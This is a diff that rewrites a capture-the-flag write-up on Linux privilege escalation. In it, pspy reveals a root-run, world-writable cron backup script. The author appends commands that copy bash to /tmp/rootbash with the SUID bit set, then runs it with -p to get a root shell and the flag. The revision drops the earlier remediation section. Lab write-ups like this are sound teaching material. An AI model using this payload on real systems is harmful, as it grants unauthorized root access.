@@ -1,99 +1,173 @@
-### Linux Privilege Escalation: Cron Job / Script Race Condition via World-Writable Script
+# Privilege Escalation via Writable Root Cron Script (PSPY)
 
-### 📝 Description
+## Overview
 
-This note details a privilege escalation vector involving a recurring administrative background process running with root privileges (UID=0). Because the script executed by the process has world-writable permissions, any unprivileged user can append arbitrary commands to it to execute them with elevated privileges. 
+When traditional enumeration does not reveal obvious privilege escalation vectors, monitoring processes can uncover scheduled tasks running as **root**. A useful tool for this is **PSPY**, which allows process monitoring without requiring root privileges.
 
-### 🔍 Phase 1: Enumeration & Discovery
+In this scenario, PSPY revealed a root-owned script that executed every few seconds and was writable by all users.
 
-### 1. Process Monitoring with pspy
+---
 
-Standard tools like ps aux might miss short-lived cron jobs or tight loops. Using pspy64 allows for unprivileged, real-time monitoring of process creation without requiring root access. 
+## 1. Monitor Running Processes with PSPY
 
-bash
+Transfer and execute PSPY on the target:
 
-# Executing pspy to monitor background processes
+```bash
+chmod +x pspy64
 ./pspy64
+```
 
-Use code with caution.
+PSPY output revealed a recurring root process:
 
-**Observed Output:**
-The logs show a repetitive cycle executing roughly every 10 seconds under UID=0 (root): 
+```text
+UID=0 | /bin/bash /var/local/syslog-backup.sh
+UID=0 | tar -czf /var/backup/syslog.tar.gz /var/log/syslog
+UID=0 | sleep 10
+```
 
-text
+This indicates that the script `/var/local/syslog-backup.sh` is being executed repeatedly by root.
 
-2026/08/28 08:14:34 CMD: UID=0     PID=1839   | /bin/bash /var/local/syslog-backup.sh 
-2026/08/28 08:14:34 CMD: UID=0     PID=1841   | tar -czf /var/backup/syslog.tar.gz /var/log/syslog 
-2026/08/28 08:14:34 CMD: UID=0     PID=1843   | sleep 10 
+---
 
-Use code with caution.
+## 2. Investigate the Script Location
 
-### 2. Inspecting File Permissions
+Check the permissions of the directory and script:
 
-Checking the targeted script reveals a major security misconfiguration—it is world-writable (-rwxrwxrwx): 
+```bash
+ls -la /var/local
+```
 
-bash
+Output:
 
-john@ip-10-49-140-63:~$ ls -la /var/local/syslog-backup.sh
--rwxrwxrwx  1 root staff   68 Jun 28 09:10 /var/local/syslog-backup.sh
+```text
+drwxrwsr-x  2 root staff 4096 Jan 20 2026 .
+-rwxrwxrwx  1 root staff   68 Jun 28 09:10 syslog-backup.sh
+```
 
-Use code with caution.
+The critical finding is:
 
-### 💥 Phase 2: Exploitation (SUID Shell Method)
+```text
+-rwxrwxrwx
+```
 
-Since the script executes as root every 10 seconds, we can inject a payload that creates a persistent SUID binary back into our user space. 
+Meaning the script is **world-writable**, allowing any user to modify code that will later be executed by root.
 
-### 1. Inject the Payload
+---
 
-Append commands to copy the system shell binary to /tmp and apply the SUID (+s) bit to it: 
+## 3. Review the Script
 
-bash
+View the contents:
 
+```bash
+cat /var/local/syslog-backup.sh
+```
+
+```bash
+#!/bin/bash
+
+tar -czf "/var/backup/syslog.tar.gz" "/var/log/syslog"
+```
+
+The script simply creates a backup of the syslog file.
+
+Because it runs as root and is writable, arbitrary commands can be added.
+
+---
+
+## 4. Inject a Privilege Escalation Payload
+
+Append commands that create a SUID version of Bash:
+
+```bash
 echo -e "cp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash" >> /var/local/syslog-backup.sh
+```
 
-Use code with caution.
+Modified script:
 
-### 2. Verify Execution
+```bash
+#!/bin/bash
 
-Wait 10–20 seconds for the cron job / timer to cycle. Check the /tmp directory to ensure the binary was created and possesses SUID permissions: 
+tar -czf "/var/backup/syslog.tar.gz" "/var/log/syslog"
 
-bash
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash
+```
 
+---
+
+## 5. Wait for Root to Execute the Script
+
+Since the script runs automatically every few seconds, wait for the scheduled task to execute.
+
+Verify the SUID Bash was created:
+
+```bash
 ls -la /tmp/rootbash
-# Expected output: -rwsr-xr-x 1 root root ... /tmp/rootbash
+```
 
-Use code with caution.
+Expected result:
 
-### 3. Trigger the Root Shell
+```text
+-rwsr-sr-x 1 root root ...
+```
 
-Modern implementations of bash automatically drop root privileges if run from an unprivileged context. To prevent this security feature from triggering, pass the -p (privileged) flag: 
+The **s** in the permissions indicates the SUID bit is set.
 
-bash
+---
 
+## 6. Spawn a Root Shell
+
+Execute Bash while preserving privileges:
+
+```bash
 /tmp/rootbash -p
+```
 
-Use code with caution.
+Verify access:
 
-**Result:** 
+```bash
+whoami
+id
+```
 
-text
+Example:
 
-rootbash-5.2# id
-uid=1001(john) gid=1001(john) euid=0(root) groups=1001(john)
-rootbash-5.2# cat /root/flag.txt
+```text
+uid=0(root) gid=0(root)
+```
+
+Retrieve the flag:
+
+```bash
+cat /root/flag.txt
+```
+
+```text
 THM{getting-root-with-pspy}
+```
 
-Use code with caution.
+---
 
-### 🛡️ Remediation & Hardening
+## Key Indicators
 
-To secure this system and prevent this vulnerability, execute the following steps as an administrator: 
+During enumeration, always look for:
 
-1. **Restrict Script Permissions:** Remove write privileges for group and others. Only the root user should be allowed to modify the script. 
+* Scheduled tasks running as root.
+* Scripts executed by cron jobs or custom automation.
+* Writable files owned by root.
+* Writable directories containing executable scripts.
+* Repeated commands observed through PSPY.
 
-bash
+Useful commands:
 
-sudo chmod 744 /var/local/syslog-backup.sh
+```bash
+./pspy64
+ls -la /var/local
+find / -writable 2>/dev/null
+```
 
-Use code with caution.
-2. **Review Directory Permissions:** Ensure unprivileged users cannot delete or replace files within /var/local/ if the directory permissions are loosely defined.
+---
+
+## Key Takeaway
+
+PSPY is extremely useful for discovering privilege escalation paths that are not visible through standard enumeration. If a process running as root repeatedly executes a script and that script is writable by a low-privileged user, arbitrary commands can be injected and executed with root privileges. Always investigate recurring root processes and verify permissions on any scripts they execute.
